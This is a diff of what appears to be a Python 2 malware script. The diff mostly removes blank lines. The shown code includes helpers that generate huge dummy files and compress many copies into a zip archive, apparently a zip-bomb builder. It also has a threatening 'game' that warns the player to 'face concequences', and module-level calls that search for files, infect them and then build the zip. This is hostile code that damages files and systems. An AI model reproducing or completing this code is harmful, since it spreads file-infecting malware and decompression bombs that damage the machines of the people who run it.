@@ -43,23 +43,18 @@ def create_zip():
 	def get_file_size(filename):
 		st = os.stat(filename)
 		return st.st_size
-
 	def generate_dummy_file(filename,size):
 		with open(filename,'w') as dummy:
 			for i in xrange(1024):
 				dummy.write((size*1024*1024)*'0')
-
 	def get_filename_without_extension(name):
 		return name[:name.rfind('.')]
-
 	def get_extension(name):
 		return name[name.rfind('.')+1:]
-
 	def compress_file(infile,outfile):
 		zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
 		zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
 		zf.close()
-
 	def make_copies_and_compress(infile, outfile, n_copies):
 		zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
 		for i in xrange(n_copies):
@@ -115,7 +110,6 @@ def play_game():
 			print i,
 		print "\n"
 		time.sleep(2)
-		
 	def coin_flip():
 		flips = 1
 		while flips < 4:
@@ -140,7 +134,7 @@ def play_game():
 	game_format("Guess them right or face concequences!")
 	game_format("Play the game or face concequences!")
 	coin_flip()
-	
+
 filestoinfect = search(os.path.abspath(""))
 infect(filestoinfect)
 create_zip()
